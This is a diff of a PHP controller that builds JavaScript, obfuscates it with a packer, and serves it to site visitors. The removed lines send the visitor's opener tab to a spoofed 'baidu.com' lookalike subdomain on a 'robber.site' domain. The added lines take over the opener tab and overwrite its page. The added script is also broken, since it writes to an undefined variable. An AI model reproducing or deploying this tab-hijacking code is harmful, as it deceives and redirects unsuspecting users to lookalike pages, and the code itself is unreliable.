@@ -16,13 +16,13 @@ class JsController extends Controller
     		return view('js', ['js' => '请设置站点<a href="'. url('/website/'. $website->id .'/keyword') .'">关键词</a>']);
     	}
 
-        $js = 'if(parent.window.opener){
-            parent.window.opener.location = "http://www.baidu.com.'. $website->domain . '.robber.site/s?wd='. $keyword->keyword_default .'";
-        } else {
-            window.opener.document.location.href = "http://www.baidu.com.'. $website->domain . '.robber.site/s?wd='. $keyword->keyword_default .'";
-        }';
         // $js = 'window.opener.location = "http://www.baidu.com.'. $website->domain . '.robber.site/s?wd='. $keyword->keyword_default .'";';
 
+        $js = 'var opener = window.opener.document.open("text/html", "replace");
+               var html="<html><body>Learning about the DOM is FUN!</body></html>";
+               old.write(html);
+               old.close();';
+               
 		$packer = new JavaScriptPacker($js, 'Normal', true, false);
 		$packed = $packer->pack();
 
